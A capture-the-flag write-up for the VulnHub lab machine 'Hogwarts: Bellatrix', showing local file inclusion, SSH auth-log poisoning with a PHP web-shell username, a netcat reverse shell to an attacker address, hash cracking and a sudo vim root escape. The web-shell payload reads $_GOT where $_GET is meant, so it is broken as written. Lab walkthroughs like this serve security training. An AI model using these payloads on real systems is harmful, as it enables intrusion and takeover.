# Hogwarts: Bellatrix

[Machine](https://www.vulnhub.com/entry/hogwarts-bellatrix,609/ "https://www.vulnhub.com/entry/hogwarts-bellatrix,609/")

## Reconnaissance

### nmap

* ssh
* http

#### http

On the start page, you can see Lestrange gif and some hint with .php on the end. Also, see the source code and understand, that here you have already all what you need.
```php
$include($file); // will include arbitrary file if a user which is running web-service has access to it.
```

## Thread modeling

So, we have a Local File Inclusion(The server loads a local file). The next step will be step with ssh.

## Vulnerability analysis

### LFI

From ikilledsiriusblack strings you really need is `ikilledsiriusblack.php` once. LFI will be next: `http://192.168.88.226/ikilledsiriusblack.php?file=/etc/passwd`.
Okay, we got LFI, but we can't read all files...I got `/etc/passwd`, took a 2 users `bellatrix` and `lestrange`. Then I was stuck. 
I tried to brute-force ssh login, but there is nothing to do with brute-force, as the hint from the machine page said. Next, I searched for ssh logs directory and it is `/var/log/auth.log`. But what did it give you? You can try to login with a non-existed user and it will be shown in `/var/log/auth.log`. So, your username is PHP-code:
```php
<?php system($_GOT['cmd']); ?>
```

### ssh

Log in:
```bash
ssh '<?php system($_GOT['cmd']); ?>'@192.168.88.226
```

Trigger LFI with `http://192.168.88.226/ikilledsiriusblack.php?file=/var/log/auth.log&cmd=whoami`. Then go to the source page and you will see:
```
Feb  2 13:46:26 bellatrix sshd[3788]: pam_unix(sshd:auth): check pass; user unknown
Feb  2 13:46:28 bellatrix sshd[3788]: Failed password for invalid user www-data
```

## Exploitation

`nc -lnvp 4444 ` and trigger LFI with replacement `whoami` as `ncat -e /bin/bash 192.168.88.225 4444`. Got www-data.

## Post exploitation

### Privilege escalation

#### lestrange

In `/var/www/html` you can see `c2VjcmV0cw==` folder, in which `.secret.dic` and `Swordofgryffindor`. Take it with `wget http://192.168.88.226/c2VjcmV0cw==/.secret.dic`. Then within them, you can see the dictionary and hash of lestrange password. Use John the Reaper: `john -w=.secret.dic Swordofgryffindor`. It will give a password `ihateharrypotter`. Log in through ssh.

#### root

Root is easy. `sudo -l` will show the (NOPASSWD) on `/usr/bin/vim`. In vim, you can execute the bash command by pressing `:` and next `!/bin/bash` or `sudo /usr/bin/vim -c ':!/bin/bash'`. Got root.

## Sources

[ssh logs](https://superuser.com/questions/1224688/where-to-find-ssh-login-log-files-on-centos "https://superuser.com/questions/1224688/where-to-find-ssh-login-log-files-on-centos")

[file inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion "https://book.hacktricks.xyz/pentesting-web/file-inclusion")

[php include();](https://www.php.net/manual/en/function.include.php "https://www.php.net/manual/en/function.include.php")

